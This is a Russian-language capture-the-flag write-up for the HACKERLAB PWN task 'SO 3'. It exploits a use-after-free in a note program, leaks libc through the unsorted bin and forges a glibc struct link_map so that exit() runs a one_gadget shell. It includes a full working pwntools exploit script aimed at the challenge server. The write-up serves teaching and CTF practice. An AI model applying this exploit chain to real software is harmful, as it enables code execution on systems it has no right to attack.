# SO 3 — HACKERLAB

**Платформа:** HACKERLAB
**Категория:** PWN
**Сложность:** Сложный
**Цель:** 62.173.140.174:28010
**Задание:** «Зачем мне этот SO 3? И снова этот SO-файл. На третий раз я точно докопаюсь, зачем он тут нужен!»

---

## Содержание

1. [Знакомство с заданием](#1-знакомство-с-заданием)
2. [Статический анализ бинарников](#2-статический-анализ-бинарников)
3. [Логика программы](#3-логика-программы)
4. [Уязвимость: Use-After-Free](#4-уязвимость-use-after-free)
5. [Утечка libc через unsorted bin](#5-утечка-libc-через-unsorted-bin)
6. [dlopen() переиспользует освобождённый чанк](#6-dlopen-переиспользует-освобождённый-чанк)
7. [Реконструкция struct link_map](#7-реконструкция-struct-link_map)
8. [UAF-запись: подмена link_map](#8-uaf-запись-подмена-link_map)
9. [Вызов без аргументов → one_gadget](#9-вызов-без-аргументов--one_gadget)
10. [Полный эксплойт](#10-полный-эксплойт)
11. [Полная цепочка атаки](#11-полная-цепочка-атаки)
12. [Использованные инструменты](#12-использованные-инструменты)
13. [Извлечённые уроки](#13-извлечённые-уроки)

---

## 1. Знакомство с заданием

В архиве задания:

```
chall                    ELF64 PIE, dynamically linked, not stripped (debug_info)
libplugin.so              ELF64 DSO, not stripped
libc.so.6                 glibc 2.42 (Ubuntu), stripped
ld-linux-x86-64.so.2      stripped
Dockerfile / build_docker.sh
flag.txt                  (заглушка; реальный флаг только на сервере)
```

```dockerfile
FROM ubuntu@sha256:e0b84ef...
RUN apt-get update && apt-get install -y socat
RUN useradd -m ctf
WORKDIR /home/ctf
COPY chall flag.txt libplugin.so ./
RUN chown -R root:ctf /home/ctf && chmod -R 750 /home/ctf && chmod 740 /home/ctf/flag.txt
EXPOSE 1337
USER ctf
CMD ["socat", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:/home/ctf/chall,stderr"]
```

Название и подсказка («…на третий раз я точно докопаюсь, зачем он тут нужен») прямым текстом намекают, что дело не в классическом heap-эксплойте, а именно в `.so`-файле — то есть в механизме `dlopen()` / динамическом линкере.

**Вывод:** сервис однопоточный, форкается на каждое подключение через `socat ... fork`, раздаёт `/home/ctf/chall` напрямую — значит, рабочая директория процесса известна (`/home/ctf`), и там же лежит `flag.txt`.

---

## 2. Статический анализ бинарников

```bash
checksec --file=chall
checksec --file=libplugin.so
```

| | RELRO | Canary | NX | PIE | Symbols |
|---|---|---|---|---|---|
| `chall` | Full | есть | есть | есть | not stripped |
| `libplugin.so` | Full | — | есть | DSO | not stripped |
| `libc.so.6` | — | — | — | — | **stripped**, glibc 2.42 (Ubuntu) |

Бинарник `chall` собран **без strip** — есть debug_info, поэтому имена функций видны напрямую через `nm`:

```
allocate_note   delete_note   edit_note   view_note   load_plugin   main
```

**Вывод:** Full RELRO + современный glibc (2.42) исключают классические трюки — перезапись GOT основного бинарника невозможна (RELRO), `__malloc_hook`/`__free_hook` в этой версии glibc уже удалены. Нужен другой write-primitive для получения управления.

---

## 3. Логика программы

Меню:

```
1. Allocate note      -> allocate_note
2. Delete note        -> delete_note
3. Edit note           -> edit_note
4. View note           -> view_note
5. Load plugin          -> load_plugin
6. Exit
```

Дизассемблирование (`objdump -d -M intel`) и восстановление псевдокода по каждой функции:

```c
// allocate_note  (state 0 -> 1)
if (state != 0) { puts("already allocated"); return; }
note = malloc(0x2000);
if (!note) exit(1);
state = 1;
malloc(0x14);        // "распорка" — чтобы нота не слилась с top-чанком при free()

// delete_note  (state 1 -> 2)
if (state != 1) { puts("cannot delete now"); return; }
free(note);           // note НЕ зануляется!
state = 2;

// view_note  — работает ВСЕГДА, проверки state нет вообще
write(1, note, 0x200);

// edit_note  (срабатывает только при state == 2)
if (state != 2) { puts("cannot edit now"); return; }
read(0, note + 0x38, 0x18);
read(0, note + 0x740, 0x370);
state = 3;

// load_plugin
if (plugin_handle) { puts("already loaded"); return; }
plugin_handle = dlopen("./libplugin.so", RTLD_NOW);
```

`libplugin.so` содержит единственную экспортируемую функцию `plugin_run()`, тело которой — просто `puts("...")`. Эта функция нигде не вызывается и не резолвится через `dlsym` — полный red herring. Настоящая цель — внутренние аллокации, которые делает сам `dlopen()`.

**Вывод:** у программы ровно одна «нота» (один глобальный указатель `note`), без массива и без индексов — весь арсенал примитивов укладывается в четыре действия: `malloc` / `free` (без обнуления указателя) / неограниченное чтение / запись при определённом `state`.

---

## 4. Уязвимость: Use-After-Free

Три независимых дефекта складываются в один мощный примитив:

1. `delete_note` вызывает `free(note)`, но **не обнуляет** глобальную переменную `note` — классический dangling pointer.
2. `view_note` читает по `note` **без какой-либо проверки `state`** — работает и до аллокации, и после `free()`, и после повторного использования памяти кем угодно.
3. `edit_note` требует `state == 2` (ровно состояние «после `delete`»), а `load_plugin` переменную `state` вообще не трогает.

Отсюда следует рабочая последовательность:

```
1 (alloc) -> 2 (delete) -> 5 (load_plugin) -> 4 (view, читаем чужую память) -> 3 (edit, пишем в чужую память)
```

На шаге `load_plugin` память освобождённого чанка окажется занята внутренностями динамического линкера — и `view_note`/`edit_note` дают read/write-примитив прямо по этим структурам.

---

## 5. Утечка libc через unsorted bin

Нота — это `malloc(0x2000)` (8192 байт), что больше максимального чанка tcache (по умолчанию ~0x408 / 1032 байта). Поэтому при `free()` чанк уходит не в tcache, а в **unsorted bin**. Он там единственный, значит `fd == bk == указатель внутрь main_arena`.

Последовательность `1 (alloc) -> 2 (delete) -> 4 (view)` отдаёт эти 16 байт напрямую — адрес внутри libc:

```
000: 00007349936ecb20   <- fd
008: 00007349936ecb20   <- bk (= fd, чанк единственный в бине)
```

Разница `leak - libc_base` — константа, зависящая только от самого бинарника `libc.so.6` (не зависит от ASLR, т.к. оба адреса сдвигаются одинаково). Я промерил её локально через `/proc/pid/maps` на нескольких независимых запусках:

```
LIBC_LEAK_OFFSET = const   # одна и та же величина на каждом запуске
```

**Вывод:** `malloc(0x2000)` — специально подобранный разработчиком размер: чуть больше tcache-порога, чтобы чанк гарантированно шёл в unsorted bin и давал чистую утечку libc без дополнительных действий. Это первая «подсказка», намеренно заложенная в задание.

---

## 6. `dlopen()` переиспользует освобождённый чанк

После `load_plugin`, `dlopen()` под капотом делает несколько мелких `malloc()`-вызовов (буфер под имя файла, `struct link_map` и другие внутренние структуры линкера). Так как освобождённый чанк 0x2000 висит в unsorted bin, аллокатор режет его **с головы** под эти запросы.

Чтобы не гадать, какая структура где легла, я прочитал `/proc/pid/mem` живого процесса (через свой же write-after-free примитив plus прямое чтение памяти как родительский процесс) и сравнил содержимое с `plugin_handle` — а это и есть сырой `struct link_map*`, потому что в glibc `dlopen()` возвращает его напрямую как непрозрачный handle.

Результат:

```
note        -> первые ~16 байт это C-строка "./libplugin.so\0"
note + 0x20 -> начало struct link_map для libplugin.so
```

**Вывод:** название задания — не метафора. Буквально приходится работать с внутренней структурой данных динамического линкера, которую обычный разработчик прикладного ПО никогда не видит.

---

## 7. Реконструкция `struct link_map`

`struct link_map` — внутренняя структура ld.so, в публичных заголовках её нет. Чтобы получить верные офсеты под конкретную версию glibc (2.42), я:

1. Взял актуальный исходник glibc (`include/link.h` — определение структуры; `elf/elf.h` — числовые значения констант `DT_*`).
2. Посчитал офсеты полей вручную с учётом выравнивания x86-64.
3. **Каждое поле проверил живым дампом памяти**, сверяя значения с независимыми источниками (`/proc/pid/maps`, `readelf -h/-l/-d libplugin.so`).

| Поле | Offset | Как проверено |
|---|---|---|
| `l_addr` | `+0x00` | равен базе `libplugin.so` из `/proc/pid/maps` |
| `l_name` | `+0x08` | равен самому `note` (строка с именем файла лежит перед link_map) |
| `l_ld` | `+0x10` | равен `base + vaddr(PT_DYNAMIC)` из `readelf -l` |
| `l_next` | `+0x18` | `0` — `libplugin.so` последний в списке загруженных объектов |
| `l_real` | `+0x28` | указывает сам на себя |
| `l_ns` | `+0x30` | `0` (базовое пространство имён) |
| `l_info[]` | `+0x40`, 84 слота по 8 байт | см. ниже |
| bitfield (`l_type`, `l_relocated`, `l_init_called`, …) | `+0x354` | `l_type=2` (lt_loaded), `l_relocated=1`, `l_init_called=1` — ровно то, что ожидается у загруженной и проинициализированной библиотеки |

Длина массива `l_info[]` считается как
`DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM`
`= 38 + 4 + 16 + 3 + 12 + 11 = 84` записи (на x86-64 `DT_THISPROCNUM = 4` — это я поймал именно эмпирически: при подстановке `0` следующие за массивом поля не совпадали ни с чем в дампе, разница была ровно `0x20` = 4 лишних 8-байтовых слота).

Индексация `l_info[]` идёт **напрямую по номеру DT-тега**. Нужные индексы и их проверка через `readelf -d libplugin.so`:

```
l_info[DT_FINI       = 13] @ +0xA8   -> {tag=0xd,  val=0x117c} == readelf -d FINI
l_info[DT_FINI_ARRAY = 26] @ +0x110  -> {tag=0x1a, val=0x3dd0} == readelf -d FINI_ARRAY
l_info[DT_FINI_ARRAYSZ=28] @ +0x120  -> {tag=0x1c, val=8}      == readelf -d FINI_ARRAYSZ
```

Каждый `l_info[tag]` — это указатель на `Elf64_Dyn { d_tag; d_un.d_ptr; }` внутри `.dynamic`-сегмента библиотеки. Сам `.dynamic` под Full RELRO и read-only после релокаций — но **указатель на него, лежащий внутри `struct link_map`, это обычная heap-память, и RELRO её не защищает.** Вот и щель в «неприступной» защите.

**Вывод:** реверс недокументированной внутренней структуры ld.so без отладочных символов требует либо точного знания исходников нужной версии glibc, либо (что надёжнее) перепроверки каждого поля вживую — расхождение хотя бы в один байт полностью ломает цепочку дальше.

---

## 8. UAF-запись: подмена `link_map`

У `edit_note` ровно два жёстко заданных окна записи:

```
write1: 0x18 байт @ note + 0x38   == link_map + 0x18   (l_next / l_prev / l_real)
write2: 0x370 байт @ note + 0x740 == link_map + 0x720   (свободная площадка в том же чанке)
```

### Как устроен `_dl_fini()` (вызывается изнутри `exit()`)

Чтобы не полагаться на предположения, я прочитал исходники `elf/dl-fini.c` и `elf/dl-call_fini.c` напрямую:

```c
unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
struct link_map *maps[nloaded];              // VLA ровно под nloaded!
for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
  if (l == l->l_real)        // <-- единственный фильтр на включение в список
    { assert (i < nloaded); maps[i++] = l; }
  else proxy_link_map = l;
unsigned int nmaps = i;
_dl_sort_maps (maps, nmaps, ...);
for (i = 0; i < nmaps; ++i)
  if (maps[i]->l_init_called)
    _dl_call_fini (maps[i]);                  // <-- целевой вызов
```

```c
void _dl_call_fini (void *closure_map) {
  struct link_map *map = closure_map;
  map->l_init_called = 0;
  ... /* обработка DT_FINI_ARRAY */ ...
  ElfW(Dyn) *fini = map->l_info[DT_FINI];
  if (fini != NULL)
    DL_CALL_DT_FINI (map, (void *) map->l_addr + fini->d_un.d_ptr);  // прямой вызов, без аргументов
}
```

Два важных нюанса, на которых я ошибся с первой попытки:

1. **Цикл обхода `l_next` НЕ ограничен `nloaded`** — проверка только через `assert`, который в релизной сборке выпилен (`NDEBUG`). Первая идея — просто добавить «лишний» фейковый узел в хвост цепочки — приводила к записи `maps[nloaded]`, то есть за пределы стекового VLA-массива: undefined behavior, на практике ничего не срабатывало стабильно.
   **Исправление:** не добавлять лишний узел, а **подменить существующий 1 к 1**. У настоящего `link_map` занулить `l_real` — он перестаёт проходить фильтр `l == l->l_real` и безопасно выпадает в `proxy_link_map`, а его `l_next` направить на новый фейковый `link_map`, у которого `l_real` указывает сам на себя. Количество засчитанных объектов (`nmaps`) остаётся ровно `nloaded`, переполнения нет.
2. Вызов `DL_CALL_DT_FINI` — это **вызов без аргументов** (`void fn(void)`), целевой адрес считается как `map->l_addr + fini->d_un.d_ptr`. Структура полностью фейковая, поэтому `l_addr` можно смело занулить, и тогда `d_un.d_ptr` — это сразу готовый абсолютный адрес цели.

### Payload

```python
write1 = p64(fake_base) + p64(0) + p64(0)
#         l_next=fake     l_prev   l_real=0 (роняет фильтр у НАСТОЯЩЕГО link_map)

fake = bytearray(0x370)
fake[0x28:0x30] = p64(fake_base)          # l_real = сам на себя
fake[0xA8:0xB0] = p64(fake_base + 0x2E0)  # l_info[DT_FINI] -> фейковый Dyn
fake[0x2E0:0x2E8] = p64(13)               # Dyn.d_tag (не проверяется)
fake[0x2E8:0x2F0] = p64(target)           # Dyn.d_un.d_ptr = libc_base + смещение гаджета
fake[0x354] = 0x12                        # l_type=lt_loaded, l_init_called=1
```

---

## 9. Вызов без аргументов → one_gadget

`_dl_call_fini` зовёт нашу цель строго как `void fn(void)` — своих аргументов мы не передаём, регистры на входе такие, какие остались после внутренней работы линкера. Решение классическое — `one_gadget`, прогнанный по выданному `libc.so.6`:

```
0xf8d89 execve("/bin/sh", rbp-0x50, r15)
constraints:
  address rbp-0x50 is writable
  r14 == NULL || {"/bin/sh", r14, NULL} is a valid argv
  [r15] == NULL || r15 == NULL || r15 is a valid envp
```

Чтобы не гадать, выполняются ли ограничения, я подвесил `ptrace` прямо из эксплойт-скрипта (`PTRACE_ATTACH` к своему же дочернему процессу — проблем с `yama/ptrace_scope` нет, так как скрипт и так родитель), поставил программный breakpoint (`int3`) на адрес гаджета и снял регистры в момент попадания:

```
rdi = r14 = fake_base      <- наша же фейковая структура!
rbp = <валидный адрес стека>
r15 = адрес настоящего link_map
```

`r14 == fake_base`, то есть гаджет возьмёт `argv[1]` из байт **по адресу `fake_base`** — а это первые 8 байт нашего же фейкового `link_map` (поле `l_addr`). Одно и то же поле памяти обслуживает сразу две роли:

* как число — `l_addr`, участвует в адресной арифметике `DT_FINI`;
* как C-строка — `argv[1]` для будущего `execve`.

Если оставить это поле нулевым, `/bin/sh` получает пустой второй аргумент и воспринимает его как путь к скрипту — падает с ошибкой открытия файла. Решение — записать туда `"-s\0"`:

```
argv = {"/bin/sh", "-s", NULL}
```

Флаг `-s` говорит `sh` читать команды **из стандартного ввода** — а это тот же самый сокет/канал, который мы и так держим открытым. Отдельный bind/reverse-shell листенер не нужен — шелл падает прямо в тот же TCP-канал.

Чтобы байты `"-s\0"` не сломали адресную арифметику `DT_FINI` (поле используется дважды), компенсирую смещение прямо в вычислении целевого адреса:

```python
l_addr_fake = u64(bytes(fake[0:8]))                         # = число, в которое превращаются байты "-s\0\0\0\0\0\0"
fake[0x2E8:0x2F0] = p64((target - l_addr_fake) & MASK64)    # l_addr + d_ptr снова равно target
```

**Вывод:** вызов без аргументов — не приговор. Если под рукой есть хоть один полностью подконтрольный буфер, который попадает в `rdi`/`r14`/`r15` при вызове `one_gadget`, его можно «двойного назначения» использовать и под служебные поля, и под данные для самого гаджета — с небольшой арифметической компенсацией.

---

## 10. Полный эксплойт

```python
import sys
from pwn import context, p64, process, remote, u64

ONE_GADGET_OFF = 0xF8D89
LIBC_LEAK_OFFSET = 0x...       # константа для конкретной libc.so.6 из задания
HOST, PORT = "62.173.140.174", 28010

def menu(p, choice):
    p.sendline(str(choice).encode())

def view_note(p):
    p.sendline(b"4")
    out = p.recvuntil(b"\n===", timeout=5)
    data = out.split(b"Content: ", 1)[1].split(b"\n\n===", 1)[0]
    p.recvuntil(b"> ", timeout=5)
    return data

def exploit(p):
    p.recvuntil(b"> ", timeout=5)
    menu(p, 1); p.recvuntil(b"> ", timeout=5)      # allocate_note
    menu(p, 2); p.recvuntil(b"> ", timeout=5)      # delete_note -> UAF

    leak_libc_raw = u64(view_note(p)[0:8])          # unsorted-bin leak
    libc_base = leak_libc_raw - LIBC_LEAK_OFFSET

    menu(p, 5); p.recvuntil(b"> ", timeout=5)       # load_plugin: dlopen reuses chunk

    note_val = u64(view_note(p)[0x28:0x30])         # l_name == note
    fake_base = note_val + 0x740
    target = libc_base + ONE_GADGET_OFF

    write1 = p64(fake_base) + p64(0) + p64(0)       # l_next, l_prev, l_real(=0)

    fake = bytearray(0x370)
    fake[0x00:0x03] = b"-s\x00"
    l_addr_fake = u64(bytes(fake[0:8]))
    fake[0x28:0x30] = p64(fake_base)
    fake[0xA8:0xB0] = p64(fake_base + 0x2E0)
    fake[0x2E0:0x2E8] = p64(13)
    fake[0x2E8:0x2F0] = p64((target - l_addr_fake) & 0xFFFFFFFFFFFFFFFF)
    fake[0x354] = 0x12
    write2 = bytes(fake)

    menu(p, 3)
    p.recvuntil(b"reason: ", timeout=5); p.send(write1)
    p.recvuntil(b"thing: ", timeout=5);  p.send(write2)
    p.recvuntil(b"> ", timeout=5)

    menu(p, 6)                                       # exit() -> _dl_fini -> shell

if __name__ == "__main__":
    p = (process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chall"])
         if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT))
    exploit(p)
    p.sendline(b"cat flag.txt")
    p.interactive()
```

Запуск: `python3 exploit.py` — на удалённый сервер, `python3 exploit.py local` — на локальную копию бинарников из задания.

Итог запуска:

```
$ python3 exploit.py
[+] libc leak = 0x...  libc_base = 0x...
[+] note = 0x...  fake_base = 0x...  target = 0x...
[+] link_map corrupted, exiting to trigger fake DT_FINI -> one_gadget
$ cat flag.txt
CODEBY{...}
```

(значение флага намеренно не публикуется в этом writeup'е — только подтверждение рабочего эксплойта).

---

## 11. Полная цепочка атаки

```
allocate_note (1)
  │  malloc(0x2000) -> note
  ▼
delete_note (2)
  │  free(note), указатель НЕ зануляется -> UAF
  ▼
view_note (4)
  │  чанк одиночный в unsorted bin
  │  fd/bk -> утечка адреса main_arena -> вычисляем libc_base
  ▼
load_plugin (5)
  │  dlopen("./libplugin.so") переиспользует освобождённый чанк
  │  под строку имени файла и struct link_map (note+0x20)
  ▼
view_note (4)
  │  читаем свежий link_map, достаём note_val (== l_name)
  ▼
edit_note (3)
  │  write1 @ link_map+0x18: l_next -> fake_base, l_real -> 0 (убираем реальный map из фильтра)
  │  write2 @ fake_base: полностью сфабрикованный struct link_map
  │    l_real = fake_base (самоссылка, проходит фильтр l == l->l_real)
  │    l_info[DT_FINI] -> фейковый Elf64_Dyn { .. , target = libc_base+one_gadget }
  │    l_init_called = 1
  │    l_addr(=argv[1]) = "-s\0"
  ▼
exit (6)
  │  __run_exit_handlers -> _dl_fini()
  │  обход l_next подхватывает fake_base вместо настоящего libplugin.so
  │  l_init_called=1 -> _dl_call_fini(fake)
  │  DL_CALL_DT_FINI вызывает one_gadget execve("/bin/sh", rbp-0x50, r15)
  │  r14 == fake_base -> argv[1] = "-s" -> /bin/sh -s читает команды из stdin
  ▼
shell в том же TCP-соединении -> cat flag.txt
```

---

## 12. Использованные инструменты

| Инструмент | Назначение |
|---|---|
| `objdump` / `readelf` / `nm` | Дизассемблирование, символы, секции `.dynamic` |
| `checksec` | Проверка защит бинарника (RELRO/Canary/NX/PIE) |
| `pwntools` | Взаимодействие с процессом/сокетом, упаковка payload'ов |
| `gdb` + собственный `ptrace`-скрипт на `ctypes` | Проверка живых офсетов `struct link_map`, снятие регистров в момент вызова one_gadget |
| `one_gadget` | Поиск адресов в `libc.so.6`, вызываемых без аргументов |
| glibc source (`include/link.h`, `elf/elf.h`, `elf/dl-fini.c`, `elf/dl-call_fini.c`) | Точная реконструкция внутренних структур/логики линкера под нужную версию glibc |
| `/proc/pid/maps`, `/proc/pid/mem` | «Живая» верификация каждого вычисленного офсета против реальной памяти процесса |

---
